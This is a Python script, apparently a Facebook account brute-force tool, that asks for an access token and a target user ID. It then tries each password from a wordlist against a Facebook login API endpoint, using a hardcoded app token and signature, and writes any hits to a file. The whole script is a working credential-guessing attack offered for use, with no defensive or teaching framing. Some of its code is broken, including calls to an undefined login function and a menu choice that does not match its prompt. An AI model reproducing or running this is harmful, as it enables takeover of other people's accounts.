import os
import sys
import time
import json
import requests
import mechanize
from mechanize import Browser
from requests import ConnectionError

logo = ("""
\033[1;91m ╭━━━┳━━━┳━━━┳━━━━┳╮╱╭╮╱╱╭━━╮╭━━━┳━━━┳━━━┳━╮╱╭╮
\033[1;91m ╰╮╭╮┃╭━━┫╭━╮┃╭╮╭╮┃┃╱┃┃╱╱┃╭╮┃┃╭━╮┃╭━╮┃╭━╮┃┃╰╮┃┃
\033[1;91m ╱┃┃┃┃╰━━┫┃╱┃┣╯┃┃╰┫╰━╯┃╱╱┃╰╯╰┫┃╱┃┃╰━╯┃┃╱┃┃╭╮╰╯┃
\033[1;91m ╱┃┃┃┃╭━━┫╰━╯┃╱┃┃╱┃╭━╮┣━━┫╭━╮┃╰━╯┃╭╮╭┫┃╱┃┃┃╰╮┃┃
\033[1;91m ╭╯╰╯┃╰━━┫╭━╮┃╱┃┃╱┃┃╱┃┣━━┫╰━╯┃╭━╮┃┃┃╰┫╰━╯┃┃╱┃┃┃
\033[1;91m ╰━━━┻━━━┻╯╱╰╯╱╰╯╱╰╯╱╰╯╱╱╰━━━┻╯╱╰┻╯╰━┻━━━┻╯╱╰━╯
\033[1;37;40m════════════════════════════════════════════════
\033[1;32;40m[✓] Creator  : Rodel C. Tarrayo Jr.
\033[1;32;40m[✓] Tool     : Brute-Force
\033[1;32;40m[✓] System   : Wi-Fi & Data
\033[1;32;40m[✓] Version  : 4.5
\033[1;32;40m[✓] Facebook : Rodel C Tarrayo Jr.
\033[1;32;40m[✓] GitHub   : HAXOR-BD1
\033[1;37;40m════════════════════════════════════════════════""")

def fbtoken():
        os.system('clear')
        print(logo)
        fb_token =input("\033[1;91m[?] \033[1;92mAccess Token\033[1;91m : \033[1;97m")
        try:
                otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
                a = json.loads(otw.text)
                fb_name = a['name']
                pick = open("login.txt", 'w')
                pick.write(fb_token)
                pick.close()
                menu()
        except KeyError:
                print ("\033[1;91m[!] Wrong")
                e =input ("\033[1;31;40m[?] \033[1;32;40mWant to pick up token? [y/n] : ")
                if e =="":
                        exit()
                elif e =="y":
                        fbtoken()
                else:
                        exit()

def menu():
        os.system('clear')
        try:
                fb_token=open('login.txt','r').read()
        except IOError:
                os.system('clear')
                print ("\033[1;31;40m[!] Token not found")
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
                otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
                a = json.loads(otw.text)
                fb_name = a['name']
                id = a['id']
        except KeyError:
                os.system('clear')
                print ("\033[1;32;40m[!] \033[1;31;40mAccount Checkpoint")
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        except requests.exceptions.ConnectionError:
                print ("\033[1;91m[!] No connection")
                exit()
        os.system("reset")
        print(logo)
        print ("\033[1;32;40m[01] Start Cracking")
        print ("\033[1;32;40m[00] Exit")
        attack =input("Select : ")
        if attack =="":
              exit()
        elif attack =="1":
                brute()
        elif attack =="2":
                exit()
        else:
            exit()

def brute():
        global fb_token
        print(logo)
        os.system('clear')
        try:
                fb_token=open('login.txt','r').read()
        except IOError:
                print ("\033[1;91m[!] Token not found")
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        os.system('clear')
        print(logo)
        try:
                email =input("\033[1;91m[+] \033[1;92mUser ID \033[1;97m\033[1;92m\033[1;97m\033[1;92m\033[1;92mTarget \033[1;91m:\033[1;97m ")
                passw =input("\033[1;91m[+] \033[1;92mPassword\033[1;92m List\033[1;91m : \033[1;97m")
                total = open(passw,"r")
                total = total.readlines()
                print (48*"\033[1;97m═")
                print ("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget User \033[1;91m:\033[1;97m "+email)
                print ("\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword")
                print ('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
                sandi = open(passw,"r")
                for pw in sandi:
                        try:
                                pw = pw.replace("\n","")
                                sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mTrying Password \033[1;91m: \033[1;97m"+pw)
                                sys.stdout.flush()
                                data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                mpsh = json.loads(data.text)
                                if 'access_token' in mpsh:
                                        dapat = open("Brute.txt", "w")
                                        dapat.write(email+" | "+pw+"\n")
                                        dapat.close()
                                        print ("\n\033[1;91m[+] \033[1;92mFound")
                                        print (48*"\033[1;97m═")
                                        print ("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
                                        print ("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
                                        exit()
                                elif 'www.facebook.com' in mpsh["error_msg"]:
                                        ceks = open("Brutecheckpoint.txt", "w")
                                        ceks.write(email+" | "+pw+"\n")
                                        ceks.close()
                                        print ("\n\033[1;91m[+] \033[1;92mFound")
                                        print (48*"\033[1;97m═")
                                        print ("\033[1;91m[!] \033[1;93mAccount Checkpoint")
                                        print ("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
                                        print ("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
                                        exit()
                        except requests.exceptions.ConnectionError:
                                print ("\033[1;91m[!] Connection Error")
                                time.sleep(0.01)
        except IOError:
                print ("\033[1;91m[!] File not found")

fbtoken()
